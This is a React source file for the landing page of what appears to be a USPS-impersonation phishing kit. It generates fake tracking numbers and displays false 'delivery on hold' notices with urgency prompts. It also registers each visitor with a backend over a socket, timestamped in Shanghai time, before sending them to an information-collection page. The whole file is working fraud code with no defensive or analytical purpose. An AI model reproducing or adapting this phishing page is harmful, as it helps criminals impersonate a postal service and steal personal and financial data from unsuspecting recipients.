import { useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { getClientId, setActivated } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function buildOrderNumber(clientId: string) {
  const seed = (clientId || 'usps-order-seed').replace(/[^a-zA-Z0-9]/g, '');
  let hash = 0;
  for (let i = 0; i < seed.length; i += 1) {
    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
  }

  const segment = (length: number, salt: number) => {
    let value = (hash ^ salt) >>> 0;
    let out = '';
    while (out.length < length) {
      value = (value * 1664525 + 1013904223) >>> 0;
      out += String(value % 10);
    }
    return out.slice(0, length);
  };

  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
}

export default function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
  const orderPlacedDate = new Intl.DateTimeFormat('en-US', {
    month: 'long',
    day: 'numeric',
    year: 'numeric',
  }).format(new Date());

  const handleContinue = () => {
    if (loading) return;
    setLoading(true);

    try {
      const clientId = getClientId();
      setActivated(true);

      const registerTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Shanghai',
        hour12: false,
      });

      let started = false;
      const start = () => {
        if (started) return;
        started = true;

        socket.emit('attach-client', { clientId }, () => {
          socket.emit('join-page', 'home');
          socket.emit('register-user', { clickTime: registerTime, clientId }, () => {
            setLoading(false);
            navigate('/info');
          });
        });
      };

      if (!socket.connected) {
        socket.connect();
        socket.once('connect', start);
        // Best-effort fallback: don't block forever if connect event is missed.
        window.setTimeout(start, 900);
        return;
      }

      start();
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-top">
          <div className="alz-step-head">
            <div>
              <div className="alz-badge">{BRAND.name}</div>
              <h1 className="alz-step-title">This package is awaiting delivery verification</h1>
              <p className="alz-step-subtitle">Confirm the recipient details so USPS can continue delivery.</p>
            </div>
          </div>
          <div className="alz-track mt-3">
            <span />
          </div>
        </div>

        <div className="alz-home-grid alz-home-order-layout">
          <div className="alz-card alz-home-main-card">
            <div className="alz-home-kicker">Package summary</div>
            <div className="alz-order-header">
              <div>
                <h2 className="alz-page-title">Delivery is on hold pending recipient confirmation</h2>
                <p className="alz-page-copy">
                  USPS could not complete delivery using the recipient details currently associated with this shipment. Review the delivery details below to continue.
                </p>
              </div>
              <div className="alz-order-id">
                <span>Tracking #</span>
                <strong>{orderNumber}</strong>
              </div>
            </div>

            <div className="alz-home-mobile-strip">
              <span>Tracking #{orderNumber}</span>
              <strong>On hold</strong>
            </div>

            <div className="alz-order-product">
              <div className="alz-order-product-thumb" />
              <div className="alz-order-product-copy">
                <div className="alz-order-product-title">This shipment requires delivery confirmation</div>
                <div className="alz-order-product-meta">1 package cannot be delivered until the recipient information is confirmed.</div>
                <div className="alz-order-product-meta">Tracking activity updated {orderPlacedDate}</div>
              </div>
              <div className="alz-order-product-price">On hold</div>
            </div>

            <div className="alz-order-panel-grid">
              <section className="alz-order-panel">
                <div className="alz-order-panel-title">Why USPS is asking for this</div>
                <div className="alz-order-panel-copy">A mismatch was detected in the delivery information associated with this shipment. Confirm the details to release the package for delivery.</div>
                <div className="alz-order-panel-meta">
                  <span>This shipment is currently on hold</span>
                  <strong>Delivery resumes after confirmation</strong>
                </div>
              </section>
            </div>

            <div className="alz-brand-row">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <div className="alz-order-action">
              <div className="alz-order-action-alert">Confirm this shipment now to avoid additional delivery delays.</div>
              <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
                {loading ? 'Opening...' : 'Confirm delivery details'}
              </button>
              <p className="alz-helper-copy">Usually takes less than 2 minutes.</p>
            </div>

            <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
            <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-home-aside-card alz-side-summary">
            <div className="alz-side-summary-title">Tracking update</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb" />
              <div>
                <div className="alz-order-mini-title">Shipment requires confirmation</div>
                <div className="alz-order-mini-copy">1 package in this shipment requires updated delivery information.</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>Delivery address review</div>
              <div>Recipient information check</div>
              <div>Shipment release pending</div>
            </div>
            <div className="alz-side-summary-box">Delivery resumes after the required information is confirmed.</div>
            <div className="alz-side-summary-help">Need help? Visit USPS support for assistance with your shipment.</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
